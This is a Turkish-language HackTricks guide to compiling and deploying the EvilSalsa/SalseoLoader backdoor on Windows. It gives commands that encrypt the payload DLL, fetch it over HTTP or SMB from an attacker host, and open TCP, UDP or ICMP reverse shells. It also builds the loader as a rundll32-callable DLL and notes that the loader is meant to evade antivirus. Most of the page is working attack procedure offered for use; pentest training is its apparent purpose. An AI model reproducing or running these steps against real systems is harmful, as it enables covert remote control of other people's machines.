# Salseo

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** bizi takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

## Binaries'leri Derleme

Github'dan kaynak kodunu indirin ve **EvilSalsa** ve **SalseoLoader**'ı derleyin. Kodu derlemek için **Visual Studio**'nun yüklü olması gerekmektedir.

Bu projeleri, kullanacağınız Windows kutusunun mimarisi için derleyin (Eğer Windows x64 destekliyorsa, bu mimariler için derleyin).

**Visual Studio**'da **sol "Build" Sekmesi** içindeki **"Platform Target"** kısmından **mimariyi seçebilirsiniz.**

(\*\*Bu seçenekleri bulamazsanız **"Project Tab"**'ına tıklayın ve ardından **"\<Project Name> Properties"**'e tıklayın)

![](<../.gitbook/assets/image (839).png>)

Sonra, her iki projeyi de derleyin (Build -> Build Solution) (Kayıtlarda çalıştırılabilir dosyanın yolu görünecektir):

![](<../.gitbook/assets/image (381).png>)

## Arka Kapıyı Hazırlama

Öncelikle, **EvilSalsa.dll**'yi kodlamanız gerekecek. Bunu yapmak için, **encrypterassembly.py** python script'ini kullanabilir veya **EncrypterAssembly** projesini derleyebilirsiniz:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Tamam, şimdi Salseo işlemlerini gerçekleştirmek için ihtiyacınız olan her şeye sahipsiniz: **encoded EvilDalsa.dll** ve **SalseoLoader'ın binary'si.**

**SalseoLoader.exe binary'sini makineye yükleyin. Hiçbir antivirüs tarafından tespit edilmemelidir...**

## **Arka kapıyı çalıştırma**

### **TCP ters shell almak (HTTP üzerinden encoded dll indirme)**

nc'yi ters shell dinleyicisi olarak başlatmayı ve encoded evilsalsa'yı sunmak için bir HTTP sunucusu kurmayı unutmayın.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **UDP ters shell almak (SMB üzerinden kodlanmış dll indirme)**

nc'yi ters shell dinleyicisi olarak başlatmayı ve kodlanmış evilsalsa'yı sunmak için bir SMB sunucusu kurmayı unutmayın.
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **ICMP ters shell almak (şifrelenmiş dll zaten kurbanın içinde)**

**Bu sefer ters shell almak için istemcide özel bir araca ihtiyacınız var. İndirin:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **ICMP Yanıtlarını Devre Dışı Bırak:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Müşteriyi çalıştır:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Kurbanın içinde, salseo şeyini çalıştıralım:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## SalseoLoader'ı ana fonksiyonu dışa aktaran DLL olarak derleme

SalseoLoader projesini Visual Studio ile açın.

### Ana fonksiyondan önce ekleyin: \[DllExport]

![](<../.gitbook/assets/image (409).png>)

### Bu proje için DllExport'ı yükleyin

#### **Araçlar** --> **NuGet Paket Yöneticisi** --> **Çözüm için NuGet Paketlerini Yönet...**

![](<../.gitbook/assets/image (881).png>)

#### **DllExport paketini arayın (Gözat sekmesini kullanarak) ve Yükle'ye basın (ve açılan pencereyi kabul edin)**

![](<../.gitbook/assets/image (100).png>)

Proje klasörünüzde **DllExport.bat** ve **DllExport\_Configure.bat** dosyaları belirdi.

### **U**ninstall DllExport

**Kaldır**'a basın (evet, garip ama bana güvenin, bu gerekli)

![](<../.gitbook/assets/image (97).png>)

### **Visual Studio'dan çıkın ve DllExport\_configure'ı çalıştırın**

Sadece **çıkın** Visual Studio'dan

Sonra, **SalseoLoader klasörünüze** gidin ve **DllExport\_Configure.bat**'ı çalıştırın.

**x64**'ü seçin (eğer x64 bir kutu içinde kullanacaksanız, benim durumum buydu), **System.Runtime.InteropServices**'i seçin ( **DllExport için Ad Alanı** içinde) ve **Uygula**'ya basın.

![](<../.gitbook/assets/image (882).png>)

### **Projeyi tekrar Visual Studio ile açın**

**\[DllExport]** artık hata olarak işaretlenmemelidir.

![](<../.gitbook/assets/image (670).png>)

### Çözümü derleyin

**Çıktı Türü = Sınıf Kütüphanesi**'ni seçin (Proje --> SalseoLoader Özellikleri --> Uygulama --> Çıktı türü = Sınıf Kütüphanesi)

![](<../.gitbook/assets/image (847).png>)

**x64** **platformunu** seçin (Proje --> SalseoLoader Özellikleri --> Derleme --> Platform hedefi = x64)

![](<../.gitbook/assets/image (285).png>)

Çözümü **derlemek** için: Derle --> Çözümü Derle (Çıktı konsolunun içinde yeni DLL'in yolu görünecektir)

### Oluşturulan Dll'i test edin

Dll'i test etmek istediğiniz yere kopyalayın ve yapıştırın.

Çalıştırın:
```
rundll32.exe SalseoLoader.dll,main
```
Eğer hata görünmüyorsa, muhtemelen işlevsel bir DLL'niz var!!

## DLL kullanarak bir shell alın

Bir **HTTP** **sunucusu** kullanmayı ve bir **nc** **dinleyicisi** ayarlamayı unutmayın.

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
